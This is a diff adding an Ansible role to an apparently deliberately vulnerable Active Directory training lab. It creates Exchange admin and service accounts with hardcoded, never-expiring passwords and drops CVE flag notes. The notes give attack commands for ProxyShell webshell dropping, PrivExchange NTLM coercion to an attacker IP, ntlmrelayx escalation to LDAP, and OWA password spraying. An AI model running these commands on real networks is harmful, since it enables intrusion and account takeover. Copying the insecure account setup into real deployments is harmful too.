@@ -1,0 +1,136 @@
+---
+# ==============================================================================
+# vuln_exchange/tasks/exchange.yml — SRV-056..080
+# Target: dc01.corp.local (AD-side Exchange stubs)
+#
+# No real Exchange is installed in this lab. This role:
+#   1. Creates Exchange-related AD groups and accounts (as a real Exchange install would)
+#   2. Sets Exchange-specific permissions (WriteDACL via Exchange Windows Permissions)
+#   3. Drops note files explaining each CVE/vector
+#
+# SRV-056  Exchange Windows Permissions group (WriteDACL — see DF-015)
+# SRV-057  Organization Management group (Exchange admin)
+# SRV-058  ProxyShell surface note (CVE-2021-34473/34523/31207)
+# SRV-059  ProxyLogon surface note (CVE-2021-26855)
+# SRV-060  CVE-2022-41082 ProxyNotShell note
+# SRV-061  Exchange NTLM relay via EWS
+# SRV-062  PrivExchange (CVE-2019-0686) NTLM coercion
+# SRV-063  Exchange mailbox export privilege
+# SRV-064  Autodiscover NTLM leak (CVE-2021-26414 pattern)
+# SRV-065  Exchange OWA brute force (no lockout on OWA)
+# SRV-066..080: stub notes for additional Exchange CVEs
+# ==============================================================================
+
+# SRV-056: Exchange Windows Permissions — see vuln_df_ext DF-015 (already set there)
+# SRV-057: Organization Management group
+- name: SRV-057 - Check if Organization Management group exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $g = Get-ADGroup -Filter "SamAccountName -eq 'Organization Management'" -ErrorAction SilentlyContinue
+    if ($g) { Write-Output "present" } else { Write-Output "absent" }
+  register: srv057_check
+  changed_when: false
+  failed_when: srv057_check.rc != 0
+
+- name: SRV-057 - Create Organization Management group
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    New-ADGroup -Name 'Organization Management' `
+      -SamAccountName 'Organization Management' `
+      -GroupScope Universal -GroupCategory Security `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "SRV-057: Exchange Organization Management (simulated)"
+    # Add mail_admin to Organization Management
+    $p = ConvertTo-SecureString 'MailAdmin2024!' -AsPlainText -Force
+    New-ADUser -Name 'mail_admin' -SamAccountName 'mail_admin' `
+      -AccountPassword $p -Enabled $true -PasswordNeverExpires $true `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "SRV-057: Exchange admin account"
+    Add-ADGroupMember -Identity 'Organization Management' -Members 'mail_admin'
+    Write-Output "changed: Exchange groups created"
+  register: srv057_set
+  changed_when: "'changed:' in srv057_set.stdout"
+  failed_when: srv057_set.rc != 0
+  when: "'absent' in srv057_check.stdout"
+
+# SRV-063: Exchange mailbox export privilege
+- name: SRV-063 - Check if svc_exchange user exists
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $u = Get-ADUser -Filter "SamAccountName -eq 'svc_exchange'" -ErrorAction SilentlyContinue
+    if ($u) { Write-Output "present" } else { Write-Output "absent" }
+  register: srv063_check
+  changed_when: false
+  failed_when: srv063_check.rc != 0
+
+- name: SRV-063 - Create svc_exchange with mailbox export rights (stub)
+  ansible.windows.win_shell: |
+    Import-Module ActiveDirectory
+    $p = ConvertTo-SecureString 'Exchange2024!' -AsPlainText -Force
+    New-ADUser -Name 'svc_exchange' -SamAccountName 'svc_exchange' `
+      -AccountPassword $p -Enabled $true -PasswordNeverExpires $true `
+      -Path "CN=Users,{{ ad_domain_dn }}" `
+      -Description "SRV-063: Exchange service account with mailbox export rights"
+    Add-ADGroupMember -Identity 'Organization Management' -Members 'svc_exchange' `
+      -ErrorAction SilentlyContinue
+    Write-Output "changed: svc_exchange created"
+  register: srv063_set
+  changed_when: "'changed:' in srv063_set.stdout"
+  failed_when: srv063_set.rc != 0
+  when: "'absent' in srv063_check.stdout"
+
+# Exchange CVE note files
+- name: SRV-056..080 - Drop Exchange attack surface notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-SRV-058-ProxyShell.txt'
+      content: |
+        SRV-058: ProxyShell (CVE-2021-34473/34523/31207)
+        ===================================================
+        Three chained Exchange vulnerabilities: SSRF + ACL bypass + deserialization RCE.
+        Affects Exchange 2013/2016/2019 pre-patch. Unauthenticated RCE.
+
+        Attack:
+          python3 proxyshell.py -u https://mail.corp.local -e admin@corp.local
+          → Webshell dropped to Exchange server
+
+        Note: No real Exchange in this lab — surface is educational.
+        Lab mail account: mail_admin@corp.local / MailAdmin2024!
+
+    - path: 'C:\Flags\FLAG-SRV-059-ProxyLogon.txt'
+      content: |
+        SRV-059: ProxyLogon (CVE-2021-26855)
+        =====================================
+        SSRF → authentication bypass on Exchange 2013-2019. Combined with
+        CVE-2021-27065 (post-auth file write), enables unauthenticated RCE.
+        CVSS: 9.8 CRITICAL
+
+        Attack surface: https://mail.corp.local/owa/
+
+    - path: 'C:\Flags\FLAG-SRV-061-Exchange-NTLM-Relay.txt'
+      content: |
+        SRV-061: Exchange NTLM Relay via EWS
+        =====================================
+        Exchange Web Services (EWS) on /EWS/Exchange.asmx supports NTLM auth.
+        Combined with PrivExchange (CVE-2019-0686), the Exchange computer account
+        can be coerced to authenticate to an attacker.
+
+        PushSubscription coercion:
+          python3 privexchange.py -ah attacker_ip mail.corp.local \
+            -u mail_admin -p MailAdmin2024! -d corp.local
+
+        Relay to LDAP:
+          ntlmrelayx.py --target ldap://dc01.corp.local --escalate-user mail_admin
+
+    - path: 'C:\Flags\FLAG-SRV-065-OWA-Brute.txt'
+      content: |
+        SRV-065: OWA Brute Force (No Account Lockout)
+        ================================================
+        Outlook Web Access (/owa/) has no account lockout policy for auth attempts.
+        Domain account lockout policy may differ from OWA Basic auth behavior.
+
+        Tool: Ruler, o365spray, Spray-AD
+        ruler --domain corp.local --username jim.halpert --password Password123! --insecure
+        spray.py -d corp.local -u users.txt -p 'Password123!' --proto owa --host mail.corp.local
